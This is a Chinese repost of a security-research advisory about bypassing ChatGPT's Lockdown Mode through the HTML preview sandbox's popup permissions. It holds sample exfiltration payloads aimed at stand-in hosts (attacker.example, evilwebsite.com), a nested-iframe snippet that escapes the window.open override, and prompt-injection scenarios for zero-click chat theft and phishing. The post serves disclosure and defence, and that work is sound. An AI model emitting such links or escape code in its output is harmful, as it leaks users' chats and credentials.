---
title: 研究人员绕过ChatGPT锁定模式，无需用户交互即可泄露聊天内容
url: https://mp.weixin.qq.com/s/Jomsm8x0bbBgKjOOm9R9fw
source: Doonsec's feed
date: 2026-11-06
fetch_date: 2026-11-07T07:55:44.041660
---

# 研究人员绕过ChatGPT锁定模式，无需用户交互即可泄露聊天内容

# 研究人员绕过ChatGPT锁定模式，无需用户交互即可泄露聊天内容

Z2O安全攻防

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

以下文章来源于骨哥说事
，作者骨哥说事

![](https://wx.qlogo.cn/mmhead/Tjnia6K0WAwymfmKQ4Vxu2yovHNIGmF3wZKN9Peic0bS16wzb8MQuwUX7HuGjlMO3NmmvxOcHnjSM/0)

**骨哥说事**
.

一个喜爱鼓捣的技术宅

|  |
| --- |
| ****声明：****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。 |

# 关键发现 * OpenAI 最近推出了封锁模式，这是一项可选的高级安全配置，专门为防范基于提示注入 (prompt injection) 窃取用户敏感数据的攻击而设计。 * Check Point Research 发现了一个安全漏洞，攻击者可以利用该漏洞轻松绕过封锁模式，使其核心防护功能完全失效。 * 该漏洞暴露出巨大的攻击风险，攻击者能够悄无声息地窃取用户完整的聊天记录，通过网络钓鱼 (phishing) 盗取用户凭证，甚至直接投递恶意软件。 * 在 ChatGPT Classic 客户端中，这种攻击无需用户进行任何操作：只要用户正常聊天对话，就足以触发静默数据窃取。

## 引言

今年早些时候，Check Point Research 曾披露过 ChatGPT代码执行运行时中的一个安全漏洞。该漏洞让攻击者能够通过DNS隧道这种隐蔽的出站通道，悄无声息地将敏感的对话内容传输到他们控制的服务器，从而绕过了运行时的网络隔离防护。相关漏洞已得到紧急修复。

在这之后，OpenAI 推出了新的安全功能：封锁模式。

封锁模式是针对已登录 ChatGPT 用户的一项可选高级安全设置。其主要目的是降低由提示注入攻击引发数据泄露的风险——此类攻击会诱使 ChatGPT 或其工具发起出站网络请求、应用连接、调用外部插件或文件下载。一个典型的例子在 OpenAI 官方发布的URL安全说明 中就有描述：攻击者欺骗AI助手加载像 `attacker.example/collect?data=<private data>` 这样的链接，即便聊天界面毫无异样，私人数据也早已被悄悄写入攻击者的服务器日志。

OpenAI 深知，无论构建多么严密的防护措施，提示注入攻击的风险始终存在。因此，封锁模式的应对策略是从根本上阻断数据可能泄露的渠道。当该模式开启后，它会将实时网页访问限制为仅加载缓存内容，阻止加载和显示来自网络的图片，禁止由 Canvas 生成的代码发起网络请求，并关闭深度研究 (Deep Research)、代理模式 (Agent Mode)、实时连接器 (live connectors) 和文件下载等功能。

![](https://mmbiz.qpic.cn/mmbiz_png/TKdPSwEibsZhrmhicgIE1lb37sEpeG9O75GozgSv3ySWCpZa8viblSicqnAcI9SPa0pbk4mdCx8zXUx748r4nnRK2ql7I1qnYr1RdcN8eBA29CI/640?wx_fmt=png&from=appmsg)

图 1 – 当Canvas试图访问外部资源时，ChatGPT会显示的封锁模式警告通知。

然而，我们却发现 ChatGPT 中存在一个漏洞，能让攻击者成功绕过封锁模式，将聊天数据隐蔽地泄露到外部服务器。

![](https://mmbiz.qpic.cn/mmbiz_png/TKdPSwEibsZhLyQ20WJ4RKpHb3HOE5AI4A6JiclBK79bkLk5cEc0b1Hp6NBaaRcMp4C3gDoEO2TNulpv9vtPLG2FrcTPxuv23liauyfFZf445U/640?wx_fmt=png&from=appmsg)

视频 1 截图 – 无需任何通知，整个聊天记录就能在绕过封锁模式的情况下被传输到第三方服务器。

这个漏洞带来的潜在威胁，远不只是聊天数据泄露这么简单。它还能让攻击者操控 ChatGPT Classic 的界面，比如显示包含任意内容的弹窗，这为实施各类网络钓鱼攻击敞开了大门。

攻击可以通过多种途径发起：一条恶意的提示 (prompt)、一个恶意的 GPT 模型，或是一次共享的聊天记录。

接下来，我们将详细介绍该漏洞的技术原理，并一步步剖析几种典型的攻击场景。

## 技术细节

2026年2月，OpenAI 在 ChatGPT 的代码块功能中加入了 HTML页面预览 特性，其界面如下图所示：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/TKdPSwEibsZhyfE3dgiaV8opLRRBdHw09UuDLLMH1BeSoonVrmfbjdtAJXHdJKJCCjntoWbFE3ODBuOn2TKxtSAVKlJlyjCBeqVS7WTjMzAicM/640?wx_fmt=png&from=appmsg)

图 2 – ChatGPT中的HTML页面预览效果。

出于安全考量，该功能的实现设计了多层保护措施。试想，如果允许用户控制并包含 JavaScript 代码的 HTML 内容直接在 ChatGPT 界面中渲染，将可能为窃取私人数据打开一条直通车。

最显而易见的安全风险包括：

* **嵌入携带聊天数据的外部图片**：`<img src="<https://evilwebsite.com/?q=personal_data>" />`。如果这类图片能够被成功加载，攻击者就能实现"零点击"式的数据窃取。
* **嵌入外部链接**：`<a href="https://evilwebsite.com/malware.exe">下载ChatGPT更新</a>`。这使得攻击者能在ChatGPT界面内直接插入极具迷惑性的社会工程学(social-engineering)陷阱，并通过分享聊天记录进行传播。
* **弹出任意URL的窗口**： 可以通过带有 `target="_blank"` 指令的链接：`<a href="<https://evilwebsite.com/>" target="_blank">点击我</a>`，或使用JavaScript命令：`window.open("https://evilwebsite.com/", "_blank", "width=380,height=260");`来实现。这种攻击在ChatGPT Classic客户端中尤为危险，因为用户很可能将弹窗误认为是可信的ChatGPT应用程序界面。
* **读取 chatgpt.com 的Cookies或localStorage数据**： 这将直接威胁到用户的会话(session)安全。

针对上述风险，系统主要通过多层次隔离和严格的运行时规则来防范。

所有由用户控制的HTML内容都被放置在沙箱 (sandbox) 环境中渲染。这种设计将不受信的内容与主ChatGPT应用程序的运行环境隔离开来，防止其直接访问父级文档、ChatGPT的界面状态、cookies或与 `chatgpt.com` 域名关联的 `localStorage` 数据。

当HTML页面试图发送数据到外部资源，或准备加载远程图片、脚本、链接，以及打开任意外部网址时，这些操作都会被沙箱监管层拦截，并以警告弹窗的形式告知用户：

![](https://mmbiz.qpic.cn/mmbiz_png/TKdPSwEibsZjGfgc6tV0TWakVOKsYfHxC53ANK1aCuic7FiaQ5JK0bQkVqvMLWnmicdzzD3uy5WPF2lF3SE9B6loL1Wc1ZyDOiaJicVyAUerbuiaMg/640?wx_fmt=png&from=appmsg)

图 3 – 当渲染的HTML页面试图访问外部资源，或用户点击了一个外部链接时，ChatGPT会弹出的确认对话框。

进一步分析实现代码后我们发现，这个沙箱机制是由两个嵌套的 `iframe` 实现的。有趣的是，我们在检查代码时注意到，沙箱并没有对 `iframe` 内的所有操作加以限制。例如，它启用了：

`allow-popups`

`` `allow-popups` `` 和

`allow-popups-to-escape-sandbox`

`` `allow-popups-to-escape-sandbox` `` 这两个权限。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/TKdPSwEibsZglmD39W4CWN9ZewJ8C3wLiblcoAibotO5MKRveZRia0eGL54zYzanv2QH4qMnUsJz0pcSSx3JkqX0aYm0ecOuMzM0PuNGH2mNFxg/640?wx_fmt=png&from=appmsg)

图 4 – HTML预览iframe的沙箱(sandbox)属性参数（高亮部分显示了宽松的弹窗权限设置）。

不过，弹窗的管控方式有所不同。沙箱内部的脚本重写了原生的 `window.open` 函数：

window.open: h=>{if(!h)return null;const{location:f}=r;return an(o,f,h),null}

window.open: h=>{if(!h)return null;const{location:f}=r;return an(o,f,h),null}

```
window.open: h=>{if(!h)return null;const{location:f}=r;return an(o,f,h),null}
```

这样一来，当在 `iframe` 里显示的网页试图打开一个新窗口时，ChatGPT 会先阻止这一操作，等待用户同意。如果页面尝试打开的窗口网址是空的（例如 `about:blank`），该重写的函数会直接返回 `null`，用户甚至不会感知到有任何异常。

**问题核心**：虽然沙箱脚本接管了 `window.open`，但 `iframe` 沙箱本身并未直接禁止弹窗功能，因为它包含了 `allow-popups` 权限。

因此，如果我们能获取到原始的、未被修改的 `window.open` 函数，就能绕过 HTML 沙箱甚至封锁模式的限制来弹窗。我们找到了一种方法：在沙箱页面内部再创建一个新的、嵌套的 `iframe`，然后调用这个嵌套 `iframe` 的 `contentWindow.open` 函数：

window.open("about:blank"); // 被系统拦截

// 创建一个新的嵌套iframe var f = document.createElement('iframe'); document.body.appendChild(f);

f.contentWindow.open("about:blank"); // 成功执行

更进一步，一旦成功打开了弹窗，攻击者就可以在其中放置任意的HTML代码。由于 `allow-popups-to-escape-sandbox` 权限的存在，这些代码将脱离沙箱环境的束缚，具有更大的操作权限。

## 攻击面剖析：在受信任的界面内窃取数据、钓鱼、投递恶意软件

这个漏洞所暴露的攻击面（attack surface）相当广泛。攻击者能够借此：

1. 隐蔽地窃取用户完整的聊天记录及上传的文件。
2. 分发伪装成合法更新的恶意软件。
3. 实施盗取用户凭证的网络钓鱼攻击。

下面我们通过几个具体场景来展示攻击是如何实现的。

### 场景一：伪装成应用窗口投递恶意软件

通常情况下，浏览器的默认设置会阻止JavaScript代码在没有用户明确点击等手势（gesture）的情况下弹窗。

因此，攻击者需要先设计一个看起来合理的"诱饵"，诱导用户点击预览页面。由于攻击者完全掌控了预览页面的内容，制作出逼真的钓鱼页面并非难事。打开的弹窗会保留ChatGPT的应用图标（用户信任感的来源），而其标题则由攻击者自由设定，这会让用户误以为自己仍在与正统的ChatGPT应用程序交互。例如，攻击者可以借此欺骗用户下载伪装成应用更新的恶意软件。ChatGPT Classic 应用本身会限制文件的自动下载，因此在弹窗内，用户还需要再次点击链接才能触发下载。

![](https://mmbiz.qpic.cn/mmbiz_png/TKdPSwEibsZiaqOiaXBU7IWKwSjJGJtOHER3UzMxlq7oqdTokziacKg2BylQurQicriaWRVlnudqjeHgbwRpiacoTkdCGUDAPo14Qg2N0e1TMr7eQQ/640?wx_fmt=png&from=appmsg)

视频 2 – 通过仿冒的ChatGPT窗口进行恶意软件投递。

在普通的网页浏览器中，实现这种攻击更加容易，因为自动下载往往不受限制。更令人担忧的是，受害者甚至无需拥有ChatGPT账户——攻击者只需分享一个包含恶意页面的聊天记录链接，任何点击其中链接的用户都可能中招。

![](https://mmbiz.qpic.cn/mmbiz_png/TKdPSwEibsZgqGtwibOFvarnv4EBgjStQRUgskEicJicw7zdtlh4UPeIOSCVpnGuBEuj0PXdKYUxtLM3PZqZ3qHXzBlXNNVxfVBLZ9LZXkoTIOQ/640?wx_fmt=png&from=appmsg)

视频 3 – 通过共享聊天进行恶意软件投递。

### 场景二：ChatGPT Classic中的“零点击”攻击

我们发现在基于 Electron 框架开发的 **ChatGPT Classic 桌面应用程序** 中，`window.open` 函数可以在**没有用户手势触发**的情况下直接弹窗。这使得前述漏洞的危险性急剧升级：攻击者可以做到完全"静默"地窃取数据，不需要用户的任何点击或交互，**仅凭正常聊天过程就能触发攻击**。这在视频1中已得到验证：一个恶意的GPT模型安静地将聊天信息泄露至攻击者的服务器。

不仅如此，我们还发现攻击者甚至能够通过弹窗**操控主ChatGPT应用窗口**，例如强制刷新页面或在用户未知的情况下执行某些操作（例如：强制退出用户账户）。这为后续攻击打开了新的大门：攻击者可以精心构造一个页面，诱骗用户在该页面重新登录认证，从而悄无声息地窃取其账号凭证。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/TKdPSwEibsZjmFrYpF2FFRQKmiafFGxITwkotDHhXSQf9HjLZJiaMNILKPzAtvHSibgGib6w7UrIkS0EtPn2cjxYXGs06p68sfrmX6u4APcIH7S4/640?wx_fmt=png&from=appmsg)

视频 4 – 针对登录凭证的网络钓鱼攻击演示。

## 结论

Check Point Research（CPR）按照负责任的漏洞披露流程，及时向 OpenAI 通报了此漏洞。2026年9月18日，OpenAI 告知我们已部署修复措施，主要的做法是**从最外层的 HTML 预览沙箱 iframe 中移除了 `allow-popups` 和 `allow-popups-to-escape-sandbox` 这两个宽松的权限**。我们随后对修复进行了验证，确认本文所描述的漏洞利用技术已无法奏效。

**安全反思**：随着AI助手日益演变为功能完备的执行环境——云端运行代码、客户端渲染内容，同时处理着医疗记录、金融数据等高敏感信息，每一项新增的功能，哪怕仅仅是为了提升便捷性设计，都可能无形中扩大整个系统的受攻击面。

尽管AI代理和应用程序内置的安全护栏（guardrails）和防护功能有助于缓解风险，但我们必须清醒地认识到，它们并不能提供万无一失的绝对安全保证。在放心地将敏感信息托付给AI，或授予其完全访问电脑的权限之前，请务必牢记这一点。保护这些复杂系统，需要我们超越单一功能的视角，以**平台整体**的思维来审视其安全性。现代AI助手的强大能力固然带来巨大的价值，但要安全地拥抱这项技术，我们必须对其中每一层设计都保有审慎的关注，尤其是那些普通用户根本想不到的底层技术细节。

原文：https://research.checkpoint.com/2026/chatgpt-lockdown-mode-bypass-phishing-malware-delivery-and-silent-data-exfiltration/

- END -

**感谢阅读，如果觉得还不错的话，动动手指给个三连吧～**

预览时标签不可点

不喜欢

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuZq5sEo9xMfOVGAKuZWic3dSmVcRnYRDwbJdF39kiaGOrw5ofgicOs4WUH5PBiaq1MXpYDVbfSlCKJ00g/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过